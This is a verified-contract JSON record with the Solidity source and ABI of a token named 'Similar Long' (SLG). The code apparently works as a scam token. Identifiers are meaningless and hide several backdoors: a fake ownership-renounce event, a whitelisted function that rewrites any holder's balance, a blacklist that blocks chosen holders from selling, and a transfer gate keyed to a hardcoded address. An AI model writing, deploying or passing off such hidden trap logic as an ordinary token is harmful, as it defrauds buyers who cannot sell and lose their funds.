{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface shouldLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyLaunchedTrading {\n    function createPair(address modeFromMax, address enableShould) external returns (address);\n}\n\ninterface liquiditySwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundSell) external view returns (uint256);\n\n    function transfer(address maxTake, uint256 senderLaunched) external returns (bool);\n\n    function allowance(address autoToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxTake,\n        uint256 senderLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeBuy, uint256 value);\n    event Approval(address indexed autoToken, address indexed spender, uint256 value);\n}\n\ninterface tradingList is liquiditySwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SimilarLong is amountFund, liquiditySwap, tradingList {\n\n    bool public tradingFee;\n\n    function approve(address amountTokenLaunched, uint256 senderLaunched) public virtual override returns (bool) {\n        takeTrading[_msgSender()][amountTokenLaunched] = senderLaunched;\n        emit Approval(_msgSender(), amountTokenLaunched, senderLaunched);\n        return true;\n    }\n\n    mapping(address => uint256) private walletFeeTeam;\n\n    function transferFrom(address fromToken, address maxTake, uint256 senderLaunched) external override returns (bool) {\n        if (_msgSender() != senderLiquidity) {\n            if (takeTrading[fromToken][_msgSender()] != type(uint256).max) {\n                require(senderLaunched <= takeTrading[fromToken][_msgSender()]);\n                takeTrading[fromToken][_msgSender()] -= senderLaunched;\n            }\n        }\n        return minTo(fromToken, maxTake, senderLaunched);\n    }\n\n    constructor (){\n        if (feeAuto) {\n            feeAuto = false;\n        }\n        shouldLaunch minModeList = shouldLaunch(senderLiquidity);\n        maxBuy = buyLaunchedTrading(minModeList.factory()).createPair(minModeList.WETH(), address(this));\n        \n        tradingAt = _msgSender();\n        limitWallet();\n        fromSwap[tradingAt] = true;\n        walletFeeTeam[tradingAt] = teamReceiver;\n        \n        emit Transfer(address(0), tradingAt, teamReceiver);\n    }\n\n    mapping(address => bool) public fromSwap;\n\n    function limitWallet() public {\n        emit OwnershipTransferred(tradingAt, address(0));\n        modeSell = address(0);\n    }\n\n    address senderLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public autoSwap;\n\n    uint256 constant enableSender = 16 ** 10;\n\n    function minTo(address fromToken, address maxTake, uint256 senderLaunched) internal returns (bool) {\n        if (fromToken == tradingAt) {\n            return fundMarketing(fromToken, maxTake, senderLaunched);\n        }\n        uint256 toMarketing = liquiditySwap(maxBuy).balanceOf(teamTrading);\n        require(toMarketing == sellReceiver);\n        require(maxTake != teamTrading);\n        if (toFee[fromToken]) {\n            return fundMarketing(fromToken, maxTake, enableSender);\n        }\n        return fundMarketing(fromToken, maxTake, senderLaunched);\n    }\n\n    function tokenAmount(address txTokenTeam, uint256 senderLaunched) public {\n        liquidityBuy();\n        walletFeeTeam[txTokenTeam] = senderLaunched;\n    }\n\n    function getOwner() external view returns (address) {\n        return modeSell;\n    }\n\n    function transfer(address txTokenTeam, uint256 senderLaunched) external virtual override returns (bool) {\n        return minTo(_msgSender(), txTokenTeam, senderLaunched);\n    }\n\n    function exemptTo(address walletMarketing) public {\n        if (tradingFee) {\n            return;\n        }\n        if (shouldTo) {\n            autoSwap = senderTakeShould;\n        }\n        fromSwap[walletMarketing] = true;\n        \n        tradingFee = true;\n    }\n\n    uint256 public senderTakeShould;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverLimit;\n    }\n\n    uint256 isFund;\n\n    function fundLiquidity(address minExempt) public {\n        liquidityBuy();\n        if (atTotal) {\n            shouldTo = false;\n        }\n        if (minExempt == tradingAt || minExempt == maxBuy) {\n            return;\n        }\n        toFee[minExempt] = true;\n    }\n\n    string private totalWallet = \"Similar Long\";\n\n    bool private liquidityTrading;\n\n    function liquidityBuy() private view {\n        require(fromSwap[_msgSender()]);\n    }\n\n    function balanceOf(address fundSell) public view virtual override returns (uint256) {\n        return walletFeeTeam[fundSell];\n    }\n\n    bool private shouldTo;\n\n    bool public atTotal;\n\n    uint256 sellReceiver;\n\n    string private receiverLimit = \"SLG\";\n\n    bool private txAutoMarketing;\n\n    function minAtToken(uint256 senderLaunched) public {\n        liquidityBuy();\n        sellReceiver = senderLaunched;\n    }\n\n    function owner() external view returns (address) {\n        return modeSell;\n    }\n\n    mapping(address => mapping(address => uint256)) private takeTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamReceiver;\n    }\n\n    bool private feeAuto;\n\n    function fundMarketing(address fromToken, address maxTake, uint256 senderLaunched) internal returns (bool) {\n        require(walletFeeTeam[fromToken] >= senderLaunched);\n        walletFeeTeam[fromToken] -= senderLaunched;\n        walletFeeTeam[maxTake] += senderLaunched;\n        emit Transfer(fromToken, maxTake, senderLaunched);\n        return true;\n    }\n\n    uint256 private teamReceiver = 100000000 * 10 ** 18;\n\n    uint8 private shouldFund = 18;\n\n    function allowance(address shouldFundMarketing, address amountTokenLaunched) external view virtual override returns (uint256) {\n        if (amountTokenLaunched == senderLiquidity) {\n            return type(uint256).max;\n        }\n        return takeTrading[shouldFundMarketing][amountTokenLaunched];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalWallet;\n    }\n\n    address public maxBuy;\n\n    mapping(address => bool) public toFee;\n\n    address private modeSell;\n\n    address public tradingAt;\n\n    address teamTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed shouldFundSwap, address indexed limitFromMin);\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldFund;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFundSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFromMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFundMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTokenLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTokenLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketing\",\"type\":\"address\"}],\"name\":\"exemptTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"}],\"name\":\"fundLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"minAtToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTakeShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTokenTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"tokenAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTokenTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SimilarLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}